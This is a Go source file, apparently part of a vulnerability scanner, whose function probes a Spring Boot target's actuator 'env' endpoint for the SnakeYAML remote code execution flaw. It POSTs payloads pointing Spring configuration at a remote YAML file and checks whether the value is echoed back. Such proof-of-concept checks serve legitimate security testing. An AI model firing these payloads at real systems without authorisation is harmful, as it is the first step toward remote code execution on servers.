package poc

import (
	"github.com/fatih/color"
	"net/http"
	"ssp/common"
	"strings"
)

func SnakeYAML_RCE(url, proxyURL string) {
	// 设定payload和路径
	payload_1 := "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
	payload_2 := "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
	path := "env"

	urltest := url + path

	// 请求1的headers设定为http.Header类型
	headers1 := make(http.Header)
	headers1.Set("User-Agent", common.GetRandomUserAgent())
	headers1.Set("Content-Type", "application/x-www-form-urlencoded")

	// 将http.Header转换为map[string]string
	headers1Map := make(map[string]string)
	for key, values := range headers1 {
		headers1Map[key] = values[0] // 取第一个值
	}

	// 通过MakeRequest发送请求1
	_, body1, err := common.MakeRequest(urltest, "POST", proxyURL, headers1Map, payload_1)
	if err != nil {
		color.Yellow("[-] %s 请求失败，跳过漏洞检查\n", url)
		return
	}

	// 请求2的headers设定为http.Header类型
	headers2 := make(http.Header)
	headers2.Set("User-Agent", common.GetRandomUserAgent())
	headers2.Set("Content-Type", "application/json")

	// 将http.Header转换为map[string]string
	headers2Map := make(map[string]string)
	for key, values := range headers2 {
		headers2Map[key] = values[0] // 取第一个值
	}

	// 通过MakeRequest发送请求2
	_, body2, err := common.MakeRequest(urltest, "POST", proxyURL, headers2Map, payload_2)
	if err != nil {
		color.Yellow("[-] %s 请求失败，跳过漏洞检查\n", url)
		return
	}

	// 检查响应内容
	if strings.Contains(string(body1), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-1", url, "Null", "9")
		common.Vulnum++
	} else if strings.Contains(string(body2), "example.yml") {
		common.PrintVulnerabilityConfirmation("SnakeYAML_RCE-2", url, "Null", "9")
		common.Vulnum++
	} else {
		color.Yellow("[-] %s 未发现SnakeYAML-RCE漏洞\n", url)
	}
}
